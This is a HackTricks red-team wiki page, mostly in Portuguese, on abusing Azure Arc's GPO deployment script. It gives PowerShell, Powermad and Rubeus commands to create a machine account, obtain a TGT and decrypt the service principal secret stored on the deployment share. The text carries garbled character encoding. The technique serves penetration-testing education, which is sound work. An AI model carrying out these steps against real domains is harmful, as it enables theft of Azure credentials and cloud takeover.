# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc permite a integra√ß√£o de novos servidores internos (servidores de dom√≠nio unidos) no Azure Arc usando o m√©todo de Objeto de Pol√≠tica de Grupo. Para facilitar isso, a Microsoft fornece um kit de ferramentas de implanta√ß√£o necess√°rio para iniciar o procedimento de integra√ß√£o. Dentro do arquivo ArcEnableServerGroupPolicy.zip, os seguintes scripts podem ser encontrados: DeployGPO.ps1, EnableAzureArc.ps1 e AzureArcDeployment.psm1.

Quando executado, o script DeployGPO.ps1 realiza as seguintes a√ß√µes:

1. Cria o GPO de Integra√ß√£o de Servidores Azure Arc dentro do dom√≠nio local.
2. Copia o script de integra√ß√£o EnableAzureArc.ps1 para o compartilhamento de rede designado criado para o processo de integra√ß√£o, que tamb√©m cont√©m o pacote de instala√ß√£o do Windows.

Ao executar este script, os administradores de sistema precisam fornecer dois par√¢metros principais: **ServicePrincipalId** e **ServicePrincipalClientSecret**. Al√©m disso, requer outros par√¢metros, como o dom√≠nio, o FQDN do servidor que hospeda o compartilhamento e o nome do compartilhamento. Detalhes adicionais, como o ID do locat√°rio, grupo de recursos e outras informa√ß√µes necess√°rias tamb√©m devem ser fornecidos ao script.

Um segredo criptografado √© gerado no diret√≥rio AzureArcDeploy no compartilhamento especificado usando a criptografia DPAPI-NG. O segredo criptografado √© armazenado em um arquivo chamado encryptedServicePrincipalSecret. Evid√™ncias disso podem ser encontradas no script DeployGPO.ps1, onde a criptografia √© realizada chamando ProtectBase64 com $descriptor e $ServicePrincipalSecret como entradas. O descriptor consiste nos SIDs do grupo de Computadores de Dom√≠nio e Controladores de Dom√≠nio, garantindo que o ServicePrincipalSecret s√≥ possa ser descriptografado pelos Controladores de Dom√≠nio e grupos de seguran√ßa de Computadores de Dom√≠nio, conforme observado nos coment√°rios do script.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

Temos as seguintes condi√ß√µes:

1. Conseguimos penetrar com sucesso na rede interna.
2. Temos a capacidade de criar ou assumir o controle de uma conta de computador dentro do Active Directory.
3. Descobrimos um compartilhamento de rede contendo o diret√≥rio AzureArcDeploy.

Existem v√°rios m√©todos para obter uma conta de m√°quina dentro de um ambiente AD. Um dos mais comuns √© explorar a cota de conta de m√°quina. Outro m√©todo envolve comprometer uma conta de m√°quina atrav√©s de ACLs vulner√°veis ou v√°rias outras configura√ß√µes incorretas.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Uma vez que uma conta de m√°quina √© obtida, √© poss√≠vel autenticar usando essa conta. Podemos usar o comando runas.exe com a flag netonly ou usar pass-the-ticket com Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Ao ter o TGT para nossa conta de computador armazenado na mem√≥ria, podemos usar o seguinte script para descriptografar o segredo do principal de servi√ßo.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativamente, podemos usar [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Neste ponto, podemos reunir as informa√ß√µes restantes necess√°rias para conectar ao Azure a partir do arquivo ArcInfo.json, que est√° armazenado na mesma unidade de rede que o arquivo encryptedServicePrincipalSecret. Este arquivo cont√©m detalhes como: TenantId, servicePrincipalClientId, ResourceGroup e mais. Com essas informa√ß√µes, podemos usar o Azure CLI para autenticar como o service principal comprometido.

## Refer√™ncias

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
